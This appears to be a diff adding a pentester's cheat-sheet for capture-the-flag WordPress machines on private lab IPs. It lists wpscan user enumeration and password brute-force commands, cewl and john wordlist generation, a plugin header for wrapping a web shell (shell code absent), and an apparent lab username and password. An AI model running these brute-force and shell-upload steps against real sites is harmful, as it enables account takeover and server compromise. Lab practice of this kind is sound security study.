@@ -1,0 +1,38 @@
+
+wpscan --url <ip> --enumerate u
+
+wpscan --url http://192.168.0.105/prehistoricforest/ --wordlist tommyboy.txt
+
+ wpscan --url http://192.168.110.103/prehistoricforest --wordlist /usr/share/ncrack/top50000.pwd --username tom
+
+wpscan -u robot/wp-admin --wordlist fsocity.dic --username elliot
+
+<?php
+ 
+/*
+Plugin Name: Shelly
+Plugin URI: http://localhost  
+Description: Bla Bla Bla  
+Author: Pingmoose
+Version: 1.0.1  
+Author URI: http://localhost  
+*/
+ 
+COPY CONTENTS OF shelly.php HERE
+ 
+?>
+___________generate wordlist
+-m minimum length
+-w wordlist name
+ruby cewl.rb -w $LAB/words.txt  http://192.168.56.223/bull/ --threads 16
+ruby cewl.rb http://minotaur -w $LAB/words.txt -m 6 --threads 16
+cewl -w words.txt -m 6 http://192.168.56.223/bull/
+wpscan --username bully --url http://minotaur/bull/ --wordlist words.txt --threads 10
+use john ruleset on wordlist
+john --wordlist=words.txt --rules --stdout > words-john.txt
+http://www.openwall.com/john/doc/EXAMPLES.shtml
+
+bully
+Bighornedbulls  
+wordpress plugin
+upload shelly.php
